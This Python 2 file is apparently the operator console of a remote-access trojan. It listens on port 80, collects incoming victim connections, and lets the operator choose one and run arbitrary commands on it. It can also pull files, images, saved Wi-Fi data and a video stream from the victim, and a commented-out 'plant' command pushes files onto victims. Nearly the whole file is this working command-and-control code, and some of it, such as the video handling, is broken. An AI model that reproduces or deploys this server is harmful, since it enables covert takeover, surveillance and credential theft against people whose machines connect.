import socket
import sys
import threading
import time
import numpy as np
import cv2
from cPickle import dumps, loads
from matplotlib import pyplot


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
all_connections = []
all_address= []
global dead
dead = False

def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 80
		s = socket.socket()
	except socket.error as msg:
		print("Socket cretion error "+str(msg))


def socket_bind():
	try:
		global host
		global port
		global s
		global t1
		global t2

		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("socket binding error: "+str(msg)+"n"+"Retrying ...")
		time.sleep(5)
		socket_bind()

# def socket_accept():
# 	conn, address = s.accept()
# 	print("connection has been established | IP "+address[0] + "PORT " + str(address[1]))
# 	send_commands(conn)
# 	conn.close()

def send_commands(conn):
	global dead
	while not dead:

		cmd = raw_input()
		length = len(str.encode(cmd))
		
		if cmd[:3] == 'get':
			conn.send(str.encode(cmd))
			fname = raw_input("enter filename with ext: ")
			f = open(fname,'wb')
			data = conn.recv(1048576)
			print data
			f.write(data)
			f.close()
			data = ""

		elif cmd[:3] == 'img':
			fname = raw_input("enter filename with ext: ")
			conn.send(str.encode(cmd))
			f = open(fname,'wb')
			data = conn.recv(1048576)
			f.write(data)
			f.close()

			# with open(fname, 'wb') as f:
			# 	print 'file opened'
			# 	while True:
			# 		data = conn.recv(1048576)
			# 		# print data
			# 		f.write(data)
			# 		if data =="":
			# 			f.close()
			# 			print 'file close()'
			# 			break
			data = ""
		
		elif cmd[:4] == 'wifi':
			conn.send(str.encode(cmd))
			data = conn.recv(1048576)
			print data
			data = ""

		elif cmd[:3] == 'vid':
			conn.send(str.encode(cmd))
			
			while True:
				
				frm = conn.recv(1048576)
	
				dis = frm.astype(float)
				# pyplot.imshow(frm,interpolation = "nearest")
				# pyplot.show()
				cv2.imshow("test", dis)
			data = ""
				

		elif cmd == 'quit':
			conn.close()
			s.close()
		
			start_turtle()

		# if cmd == 'plant':
		# 	file = raw_input("enter file: ")
		# 	print file
		# 	f = open(file,'rb')

		# 	l = f.read(1048576)
			
		# 	conn.send(str.encode(cmd) + l)

		elif int(length) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1048576))
			print(client_response)
			data = ""

def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_address[:]
	while True:
		try:
			conn, address =s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_address.append(address)
			print("\nconnection has been established: " + address[0])
			
		except:
			print("error accepting connections")



def start_turtle():
	global dead
	while True:
		cmd = raw_input('mr.User> ')
		if cmd == 'list':
			list_connections()
		
			# conn = get_target(cmd)
			nput = raw_input("select a pc: ")
			conn = all_connections[int(nput)]
			if conn is not None:
				print (str(all_address[int(nput)][0])+">")
				send_commands(conn)
		else:
			print("command is not recognized")

def list_connections():
	results = ''
	# for i,conn in enumerate(all_connections):
	# 	try:
	# 		conn.send(str.encode(' '))
	# 		conn.recv(20480)
	# 	except:
	# 		del all_connections[i]
	# 		del all_address[i]
	# 		continue
	# 	results += str(i)+' '+str(all_address[i][0])+' '+str(all_address[i][1])+'\n'
	print("------clients-----" + '\n'+results)
	x = 0
	for i in all_address:
		print str(x)+' '+str(i[0])+':'+str(i[1])
		x+=1


def main():
	
	socket_create()
	socket_bind()
	t1 = threading.Thread(target = accept_connections)
	t2 = threading.Thread(target = start_turtle)
	
	t1.start()
	t2.start()
	
	t1.join()
	t2.join()
	
	
	# # socket_accept()
	# accept_connections()
	# start_turtle()

	

if __name__ == '__main__':
	main()